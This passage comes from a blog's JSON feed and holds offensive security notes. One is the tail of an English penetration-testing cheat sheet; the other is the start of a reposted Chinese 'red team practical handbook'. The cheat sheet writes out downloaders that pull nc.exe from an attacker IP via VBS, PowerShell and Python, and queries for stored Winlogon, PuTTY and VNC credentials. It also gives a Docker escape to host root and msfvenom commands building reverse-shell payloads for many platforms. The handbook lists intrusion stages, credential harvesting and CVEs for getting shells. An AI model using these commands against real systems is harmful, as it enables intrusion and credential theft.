&quot;&quot;</code> <br />\n <code>net stop upnphost</code> <br />\n <code>net start upnphost</code></p>\n</li>\n<li>\n<p>Quick wins<br />\n <code>reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;</code> <br />\n <code>reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot;</code> <br />\n <code>reg query&quot; HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot;</code> <br />\n <code>reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot;</code></p>\n</li>\n<li>\n<p>Download file with VBS</p>\n</li>\n</ul>\n<pre><code>dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)\ndim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)\nxHttp.Open &quot;GET&quot;, &quot;http://yourIp/nc.exe&quot;, False\nxHttp.Send\n\nwith bStrm\n    .type = 1 \\'//binary\n    .open\n    .write xHttp.responseBody\n    .savetofile &quot;C:\\\\Users\\\\Public\\\\nc.exe&quot;, 2 \\'//overwrite\nend with\n</code></pre>\n<ul>\n<li>\n<p>Download with Powershell 3+<br />\n <code>powershell -NoLogo -Command &quot;Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\\Users\\Public\\Downloads\\nc.exe'&quot;</code></p>\n</li>\n<li>\n<p>Download with Powershell 2<br />\n <code>powershell -NoLogo -Command &quot;$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\\Users\\Public\\Download\\nc.exe')&quot;</code></p>\n</li>\n<li>\n<p>Download with Python<br />\n <code>c:\\Python26\\python.exe -c &quot;import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()&quot; </code></p>\n</li>\n<li>\n<p>Windows specific LPE vulns</p>\n</li>\n</ul>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTExOTkv\">https://www.exploit-db.com/exploits/11199/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTgxNzYv\">https://www.exploit-db.com/exploits/18176/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTU2MDkv\">https://www.exploit-db.com/exploits/15609/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQyMjY5L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/42269/exploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ2MTM2L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/46136/exploit</span></li>\n</ul>\n<h2 id=\"inside-linux\"><a class=\"anchor\" href=\"#inside-linux\">#</a> Inside Linux</h2>\n<ul>\n<li>Basic enumeration</li>\n</ul>\n<p>System info<br />\n <code>uname -a</code></p>\n<p>Arch<br />\n <code>uname -m</code></p>\n<p>Kernel<br />\n <code>cat /proc/version\t</code></p>\n<p>Distro<br />\n <code>cat /etc/*-release</code>  or  <code>cat /etc/issue</code></p>\n<p>Filesystem<br />\n <code>df -a\t</code></p>\n<p>Users<br />\n <code>cat /etc/passwd</code></p>\n<p>Groups<br />\n <code>cat /etc/group</code></p>\n<p>Super accounts<br />\n <code>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;'</code></p>\n<p>Currently logged in<br />\n <code>finger</code> ,  <code>w</code> ,  <code>who -a</code> ,  <code>pinky</code> ,  <code>users</code></p>\n<p>Last logged users<br />\n <code>last</code> ,  <code>lastlog</code></p>\n<p>Cheeky test -<br />\n <code>sudo -l</code></p>\n<p>Anything interesting we can run as sudo?<br />\n <code>sudo -l 2&gt;/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2&gt;/dev/null</code></p>\n<p>History -<br />\n <code>history</code></p>\n<p>Env vars<br />\n <code>env</code></p>\n<p>Available shells<br />\n <code>cat /etc/shells\t</code></p>\n<p>SUID files<br />\n <code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>SUID owned by root<br />\n <code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>GUID files<br />\n <code>find / -perm -2000 -type f 2&gt;/dev/null\t</code></p>\n<p>World writable<br />\n <code>find / -perm -2 -type f 2&gt;/dev/null</code></p>\n<p>World writable executed<br />\n <code>find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null\t</code></p>\n<p>World writable dirs<br />\n <code>find / -perm -2 -type d 2&gt;/dev/null</code></p>\n<p>rhost files<br />\n <code>find /home –name *.rhosts -print 2&gt;/dev/null\t</code></p>\n<p>Plan files<br />\n <code>find /home -iname *.plan -exec ls -la &#123;&#125; ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>hosts.equiv<br />\n <code>find /etc -iname hosts.equiv -exec ls -la &#123;&#125; 2&gt;/dev/null ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>Can we peek at /root?<br />\n <code>ls -ahlR /root/\t</code></p>\n<p>Find ssh files<br />\n <code>find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls -la</code></p>\n<p>Inetd<br />\n <code>ls -la /usr/sbin/in.*\t</code></p>\n<p>Grep logs for loot<br />\n <code>grep -l -i pass /var/log/*.log 2&gt;/dev/null\t</code></p>\n<p>What do we have in logs<br />\n <code>find /var/log -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>Find conf files in /etc<br />\n <code>find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>as above<br />\n <code>ls -la /etc/*.conf\t</code></p>\n<p>List open files<br />\n <code>lsof -i -n\t</code></p>\n<p>Can we read root mail?<br />\n <code>head /var/mail/root\t</code></p>\n<p>What is running as root?<br />\n <code>ps aux | grep root\t</code></p>\n<p>Lookup paths to running files<br />\n <code>ps aux | awk '&#123;print $11&#125;'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'</code></p>\n<p>Exports and permissions of NFS<br />\n <code>ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null\t</code></p>\n<p>List sched jobs<br />\n <code>ls -la /etc/cron*\t</code></p>\n<p>List open connections (run with sudo/as root for more results)<br />\n <code>lsof -i</code></p>\n<p>Installed pkgs:<br />\n <code>dpkg -l</code>  (debian),  <code>rpm -qa</code>  (RH)</p>\n<p>sudo version?<br />\n <code>sudo -V</code></p>\n<p>Available compilers<br />\n <code>dpkg --list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed 'gcc*' 2&gt;/dev/null| grep gcc 2&gt;/dev/null</code></p>\n<h3 id=\"docker-tips\"><a class=\"anchor\" href=\"#docker-tips\">#</a> Docker tips</h3>\n<p>Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker's privs instead.</p>\n<p><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash</code>  - note that the root folder from host is mounted as  <code>/host</code> . You'll also see all processes running on host and be connected to same NICs.</p>\n<p>You may want to look into escaping UTS and IPC namespacing with  <code>--uts=host --ipc=host</code></p>\n<h3 id=\"upload-files-using-curl-with-webdav\"><a class=\"anchor\" href=\"#upload-files-using-curl-with-webdav\">#</a> Upload files using cUrl with WebDAV</h3>\n<pre><code>curl -T nc.exe http://targetIP/nc.txt\ncurl -X MOVE -v -H &quot;Destination:http://targetIP/nc.exe&quot; http://targetIP/nc.txt\n</code></pre>\n<h2 id=\"msfvenom\"><a class=\"anchor\" href=\"#msfvenom\">#</a> msfvenom</h2>\n<h3 id=\"list-payloads\"><a class=\"anchor\" href=\"#list-payloads\">#</a> List payloads</h3>\n<p>msfvenom -l</p>\n<h3 id=\"binaries\"><a class=\"anchor\" href=\"#binaries\">#</a> Binaries</h3>\n<ul>\n<li>\n<p>Linux<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>\n</li>\n<li>\n<p>Windows<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>\n</li>\n<li>\n<p>Mac<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>\n</li>\n</ul>\n<h3 id=\"web-payloads\"><a class=\"anchor\" href=\"#web-payloads\">#</a> Web Payloads</h3>\n<ul>\n<li>\n<p>PHP<br />\n <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code> <br />\n <code>cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>\n</li>\n<li>\n<p>ASP<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p>\n</li>\n<li>\n<p>JSP<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p>\n</li>\n<li>\n<p>WAR<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p>\n</li>\n</ul>\n<h3 id=\"scripting-payloads\"><a class=\"anchor\" href=\"#scripting-payloads\">#</a> Scripting Payloads</h3>\n<ul>\n<li>\n<p>Python<br />\n <code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p>\n</li>\n<li>\n<p>Bash<br />\n <code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p>\n</li>\n<li>\n<p>Perl<br />\n <code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p>\n</li>\n</ul>\n<h3 id=\"shellcode\"><a class=\"anchor\" href=\"#shellcode\">#</a> Shellcode</h3>\n<p>For all shellcode see  <code>msfvenom –help-formats</code>  for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>\n<ul>\n<li>\n<p>Linux Based Shellcode<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Windows Based Shellcode<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Mac Based Shellcode<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n</ul>\n<h2 id=\"shellshock\"><a class=\"anchor\" href=\"#shellshock\">#</a> Shellshock</h2>\n<ul>\n<li>\n<p>CVE-2014-6271<br />\n <code>env X='() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</code></p>\n</li>\n<li>\n<p>CVE-2014-7169<br />\n <code>env X='() &#123; (a)=&gt;\\' bash -c &quot;echo date&quot;; cat echo</code></p>\n</li>\n<li>\n<p>CVE-2014-7186<br />\n <code>bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' || echo &quot;CVE-2014-7186 vulnerable, redir_stack&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-7187<br />\n <code>(for x in &#123;1..200&#125; ; do echo &quot;for x$x in ; do :&quot;; done; for x in &#123;1..200&#125; ; do echo done ; done) | bash || echo &quot;CVE-2014-7187 vulnerable, word_lineno&quot;</code></p>\n</li>\n<li>\n<p>CVE-2014-6278<br />\n <code>env X='() &#123; _; &#125; &gt;_[$($())] &#123; echo CVE-2014-6278 vulnerable; id; &#125;' bash -c :</code></p>\n</li>\n</ul>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm9mZmVuc2l2ZS1zZWN1cml0eS5jb20vIyFvc2NwLWV4YW0tZ3VpZGUubWQ=\">OSCP Exam Guide</span> - MUST read!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JpdHZpamF5cy5naXRodWIuaW8v\">The Magic of Learning</span> - a real treasure trove!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbQ==\">FuzzySecurity</span> - this is something you must bookmark... period. I found the <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS90dXRvcmlhbHMvMTYuaHRtbA==\">Windows Privilege Escalation Fundamentals</span> especially useful.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29tcHV0ZXJob3BlLmNvbS93bWljLmh0bQ==\">WMIC reference/guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzLw==\">SysInternals</span> - this is a must have for working on Windows boxes.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==\">PowerSploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD03Mzg=\">Elevating privileges by exploiting weak folder permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jYXJuYWwwd25hZ2UuY29tL3BhcGVycy9MQVJFUy1Db2xkRnVzaW9uLnBkZg==\">ColdFusion for PenTesters</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9ibG9nL2NvbGRmdXNpb24tZGlyZWN0b3J5LXRyYXZlcnNhbC1mYXEtY3ZlLTIwMTAtMjg2MS8=\">ColdFusion Path Traversal</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvcGVuZXRyYXRpb24tdGVzdGluZy10b29scy1jaGVhdC1zaGVldC8=\">Penetration Testing Tools Cheat Sheet</span> - Good read. Check out other cheat sheets on this page too!</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2t1cm9iZWF0cy9maW1hcA==\">fimap</span> - LFI/RFI scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3p0Z3JhY2UvY2hhbmdlbWU=\">Changeme</span> - default password scanner</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXJ0Lm5ldC9wYXNzd29yZHM=\">CIRT Default Passwords DB</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Jlc291cmNlcy5pbmZvc2VjaW5zdGl0dXRlLmNvbS9sb2NhbC1maWxlLWluY2x1c2lvbi1jb2RlLWV4ZWN1dGlvbg==\">From LFI to Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGludXgtY29tbWFuZHMtY2hlYXQtc2hlZXQv\">Useful Linux commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVib290dXNlci5jb20vP3A9MTYyMw==\">Local Linux Enumeration</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzMx\">Creating Metasploid Payloads</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL211Yml4L3NoZWxsc2hvY2tlci1wb2Nz\">Shellshock PoCs</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "RedTeam"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/RedTeamer/",
            "url": "https://self-ferry.github.io/2021/01/18/RedTeamer/",
            "title": "红方人员实战手册【转】",
            "date_published": "2021-01-18T07:13:54.000Z",
            "content_html": "<h1 id=\"红方人员实战手册\"><a class=\"anchor\" href=\"#红方人员实战手册\">#</a> 红方人员实战手册</h1>\n<h2 id=\"声明\"><a class=\"anchor\" href=\"#声明\">#</a> 声明</h2>\n<pre><code>Author : By klion\nDate   : 2020.2.15\n寄语    : 愿 2020 后面的每一天都能一切安好\n\n</code></pre>\n<h2 id=\"分享初衷\"><a class=\"anchor\" href=\"#分享初衷\">#</a> 分享初衷</h2>\n<pre><code>一来, 旨在为 &quot;攻击&quot; / &quot;防御&quot;方 提供更加全面实用的参考\n还是那句老闲话 &quot;未知攻焉知防&quot;, 所有单纯去说 &quot;攻&quot; 或者 &quot;防&quot; 的都是耍流氓, 攻守兼备才能把路越走越宽\n\n二来, 也是为秉承共享协作, 希望能为 红队 及 部分实战攻防研究人员 做出自己应有的贡献\n个人一直坚信, 真正的价值来源于实实在在的奉献,与其天天到处嘴炮,不如静下心来多反思下自己,好好踏踏实实做些对大家都有益的事\n\n</code></pre>\n<h2 id=\"丑话说在前面\"><a class=\"anchor\" href=\"#丑话说在前面\">#</a> 丑话说在前面</h2>\n<pre><code>严禁任何 个人/组织机构 利用以下相关技术去从事任何未经合法授权的 网络入侵攻击破坏或者黑产活动\n严禁任何 个人/组织机构 以此来进行任何形式的 商业牟利 或 恶意炒作行为,包括各类非法渗透培训,误人子弟的负面恶意引导等....\n严禁一切的恶意传播及非法利用,由此所产生的一切恶果也均由读者自行承担\n\n</code></pre>\n<h2 id=\"说明\"><a class=\"anchor\" href=\"#说明\">#</a> 说明</h2>\n<pre><code>以下仅针对日常 &quot;红队&quot; 场景, 进行了一次相对全面完整的实战攻击利用技术提炼汇总\n针对不同的渗透阶段,所可能会用到的一些技术都做了详尽梳理说明 (后面可能还会整理出对应的完整工具链,虽然那不是最主要的)\n由于红队不同于一般的渗透测试, 强调更多的是如何搞进去拿到相应机器权限 或者 实现某特定目的\n而不局限于你一定要在什么时间, 用什么技术 或者 必须通过什么途径去搞,相比传统渗透测试,红队则更趋于真实的入侵活动\n这种场景其实对防御者的 实战对抗经验 和 技术深度 都是比较大的挑战\n所以,以下的所有技术点也几乎都是完全站在这种场景和角度下来考量梳理的\n需要特别说明的是, 所有攻击手法在现实中都绝不是完全孤立使用的, 往往很多手法都是相互灵活组合起来进行循环利用\n由于绝大部分内容都是基于本人平时学习实战积累的一些经验,加之每个人的实际渗透思路都不同\n所以肯定会有遗漏的地方,也欢迎弟兄们一起来积极指正补充完善\n个人觉得,最好的防御永远不是怎么去防某个工具,是个明白人都知道,因为工具这些东西本身就是死的\n稍微改下,定制下, 现有的规则可能马上就防不住了,且一直会处于疲于应付的被动防御状态\n尤其是针对红队这种特殊场景的,你的实际对手很可能都是有一定技术实力的人\n所以针对每种核心的攻击技术技术展开做深入分析, 直接从源头上进行防御才是最靠谱的\n虽然说短期这种成本代价相对较高, 但长期来看, 是一劳永逸的, 沉淀下来的这些东西最终也会慢慢形成自己产品的核心竞争力和特色\n说白点,这种对抗,本质上拼的还是双方的技术实力,不仅要能在不知觉的情况下搞进去,而且要能无限制加大对方后期的溯源成本\n另外,作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心\n\n</code></pre>\n<h2 id=\"日常流程简要说明\"><a class=\"anchor\" href=\"#日常流程简要说明\">#</a> 日常流程简要说明</h2>\n<pre><code>入口权限 =&gt; 内网搜集/探测 =&gt; 免杀提权[非必须] =&gt; 抓取登录凭证 =&gt; 跨平台横向 =&gt; 入口维持 =&gt; 数据回传 =&gt; 定期权限维护\n\n</code></pre>\n<h2 id=\"0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心\"><a class=\"anchor\" href=\"#0x01-入口权限获取-前期侦察搜集阶段本身就不存在太多可防御的点非防御重心\">#</a> 0x01 入口权限获取 [前期侦察，搜集阶段本身就不存在太多可防御的点，非防御重心]</h2>\n<pre><code>绕CDN找出目标所有真实ip段\n找目标的各种Web管理后台登录口\n批量抓取目标所有真实C段 Web banner\n批量对目标所有真实C段 进行基础服务端口扫描探测识别\n尝试目标DNS是否允许区域传送,如果不允许则继续尝试子域爆破\n批量抓取目标所有子域 Web banner\n批量对目标所有子域集中进行基础服务端口探测识别\n批量识别目标 所有存活Web站点的Web程序指纹 及其详细版本\n从 Git 中查找目标泄露的各类 敏感文件 及 账号密码,偶尔甚至还能碰到目标不小心泄露的各种云的 &quot;AccessKey&quot;\n从网盘 / 百度文库 中查找目标泄露的各类 敏感文件 及 账号密码\n从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使 ]\n目标Svn里泄露的各类 敏感文件\n网站目录扫描 [ 查找目标网站泄露的各类敏感文件, 网站备份文件, 敏感配置文件, 源码 , 别人的webshell, 等等等...]\n目标站点自身在前端代码中泄露的各种敏感信息\nfofa / shodan / bing / google  hacking 深度利用\n搜集目标 学生学号 / 员工工号 / 目标邮箱 [ 并顺手到各个社工库中去批量查询这些邮箱曾经是否泄露过密码 ]\n目标自己对外提供的各种 技术文档 / wiki 里泄露的各种账号密码及其它敏感信息\n目标微信小程序\n分析目标app Web请求\n借助js探针搜集目标内网信息\n想办法混入目标的各种 内部QQ群 / 微信群\n分析目标直接供应商 [尤其是技术外包]\n根据前面已搜集到的各类信息制作有针对性的弱口令字典\n目标所用 Waf 种类识别 与 绕过\nBypassWAF 文件上传 / 读取 / 下载\n   BypassWAF Sql注入\n   BypassWAF RCE\n   BypassWAF 各类Java Web中间件已知Nday漏洞利用\n   BypassWAF Webshell 免杀\n\t\n其它更多 , 待补充修正...\n\n</code></pre>\n<h2 id=\"0x02-入口权限获取-外部防御重心-重中之重\"><a class=\"anchor\" href=\"#0x02-入口权限获取-外部防御重心-重中之重\">#</a> 0x02 入口权限获取 [外部防御重心 ( &quot;重中之重&quot;) ]</h2>\n<pre><code>此阶段,主要是针对各主流 &quot;中间件 + 开源程序 + Web服务组件&quot; 自身的各种已知Nday漏洞利用\n如下已按 &quot;实际攻击利用的难易程度&quot; 及 &quot;获取到的shell权限高低&quot; 为标准进行了详细排序,由于完全以实战利用为导向\n故,仅仅只挑选了一些相对会经常遇到的,且实战中确实能有效协助快速getshell 的 &quot;中间件&quot; , &quot;开源程序&quot; 及 &quot;web组件&quot;\n\n</code></pre>\n<h2 id=\"针对各类java中间件的各种已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对各类java中间件的各种已知nday漏洞利用\">#</a> 针对各类 Java 中间件的各种已知 Nday 漏洞利用</h2>\n<pre><code>不同于其它脚本类web程序,Java的运行权限通常都比较高,甚至大部分都是直接用root/administrator/system权限在跑\n所以拿到的shell权限一般也非常高,通常都直接是服务器权限\n尤其是在各种红队场景中,入侵者一般也都会首选这些点,并以此为突破口来获取一个稳定的跳板机入口权限\n关于到底哪些行业特别爱用哪些中间件,这些也应该都是有事先分析梳理汇总好的\n\n</code></pre>\n<ul>\n<li>Struts2</li>\n</ul>\n<pre><code>Struts2-005\nStruts2-008\nStruts2-009\nStruts2-013\nStruts2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)\nStruts2-019\nStruts2-020\nStruts2-devmode\nStruts2-032\nStruts2-033\nStruts2-037\nStruts2-045\nStruts2-046\nStruts2-048\nStruts2-052\nStruts2-053\nStruts2-057\n\n</code></pre>\n<ul>\n<li>weblogic</li>\n</ul>\n<pre><code>CVE-2019-2725\nCVE-2019-2729\nCVE-2018-3191\nCVE-2018-2628\nCVE-2018-2893\nCVE-2018-2894\nCVE-2017-3506\nCVE-2017-10271\nCVE-2017-3248\nCVE-2016-0638\nCVE-2016-3510\nCVE-2015-4852\nCVE-2014-4210\n\nSSRF\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Jboss</li>\n</ul>\n<pre><code>CVE-2015-7501\nCVE-2017-7504\nCVE-2017-12149\n\n未授权访问,部署webshell\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>wildfly [jboss 7.x 改名为 wildfly]</li>\n</ul>\n<pre><code>控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Tomcat</li>\n</ul>\n<pre><code>CVE-2016-8735\nCVE-2017-12615 [ readonly 实际设为 true的情况较少,稍鸡肋 ]\nCVE-2020-1938 [ AJP协议漏洞, 直接把8009端口暴露在外网的不太多,稍鸡肋 ]\n\n控制台弱口令,部署webshelll [ 注: 7.x版本后,默认加了防爆机制 ]\n\n</code></pre>\n<ul>\n<li>Jekins</li>\n</ul>\n<pre><code>CVE-2018-1999002 [任意文件读取]\n\n未授权访问,任意命令执行\n控制台弱口令,任意命令执行\n\n</code></pre>\n<ul>\n<li>ElasticSearch</li>\n</ul>\n<pre><code>CVE-2014-3120 [专门针对老版本(无沙盒)RCE]\nCVE-2015-1427 [Groovy RCE]\nCVE-2015-3337 [任意文件读取]\n\n未授权访问,敏感信息泄露\n\n</code></pre>\n<ul>\n<li>RabbitMQ</li>\n</ul>\n<pre><code>弱口令\n\n</code></pre>\n<ul>\n<li>Glassfish</li>\n</ul>\n<pre><code>任意文件读取 [ 低版本 ]\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>IBM Websphere</li>\n</ul>\n<pre><code>Java 反序列化\n控制台弱口令,部署webshell\n\n</code></pre>\n<ul>\n<li>Axis2</li>\n</ul>\n<pre><code>任意文件读取\n目录遍历\n\n</code></pre>\n<ul>\n<li>Apache ActiveMQ</li>\n</ul>\n<pre><code>未授权访问,5.12 之前的版本 fileserver存在 PUT任意写\nCVE-2015-5254\n\n</code></pre>\n<ul>\n<li>Apache Solr</li>\n</ul>\n<pre><code>CVE-2017-12629\nCVE-2019-0193 [ Apache Solr 5.x - 8.2.0 ]\n\n</code></pre>\n<ul>\n<li>Apache Zookeeper</li>\n</ul>\n<pre><code>未授权访问,敏感信息泄露\n\n</code></pre>\n<ul>\n<li>Apache Shiro 反序列化</li>\n<li>fastjson &lt;= 1.2.47 反序列化利用</li>\n</ul>\n<h2 id=\"针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口\"><a class=\"anchor\" href=\"#针对各类windows-php集成环境-由于此类环境拿到的webshell权限相对较高所以通常也是红队人员的首选突破口\">#</a> 针对各类 Windows php 集成环境  [由于此类环境拿到的 Webshell 权限相对较高，所以，通常也是红队人员的首选突破口]</h2>\n<pre><code>AppServ\nXampp\n宝塔\nPhpStudy\t\t\n......\n\n</code></pre>\n<h2 id=\"针对各类开源程序的-已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对各类开源程序的-已知nday漏洞利用\">#</a> 针对各类开源程序的 已知 Nday 漏洞利用</h2>\n<pre><code>Dedecms \t后台弱口令,系列已知nday漏洞利用\nthinkphp 5.x \t后台弱口令,系列已知nday漏洞利用\nphpcms \t\t后台弱口令,系列已知nday漏洞利用\necshop \t\t后台弱口令,系列已知nday漏洞利用\nMetinfo \t后台弱口令,系列已知nday漏洞利用\ndiscuz \t\t后台弱口令,系列已知nday漏洞利用\n帝国cms \t后台弱口令,系列已知nday漏洞利用\nphpmyadmin \t数据库弱口令,系列已知nday漏洞利用\nwordpress \t后台弱口令,系列已知nday漏洞利用\njoomla \t\t后台弱口令,系列已知nday漏洞利用\ndrupal \t\tCVE-2018-7600 ,后台弱口令,系列已知nday漏洞利用\n......\n\n</code></pre>\n<h2 id=\"针对其它各类web组件的-已知nday漏洞利用\"><a class=\"anchor\" href=\"#针对其它各类web组件的-已知nday漏洞利用\">#</a> 针对其它各类 Web 组件的 已知 Nday 漏洞利用</h2>\n<ul>\n<li>IIS 6.0 RCE</li>\n</ul>\n<pre><code>短文件漏洞\nPUT 任意写\nWebdav RCE CVE-2017-7269\n\n</code></pre>\n<ul>\n<li>禅道项目管理系统</li>\n</ul>\n<pre><code>SQL注入\n文件读取\n远程执行\n\n</code></pre>\n<ul>\n<li>通达 OA</li>\n</ul>\n<pre><code>SQL注入\n任意上传\n\n</code></pre>\n<ul>\n<li>Exchange</li>\n</ul>\n<pre><code>利用接口进行邮箱用户名枚举\n针对各个接口的弱口令爆破\nCVE-2020-0688 [ 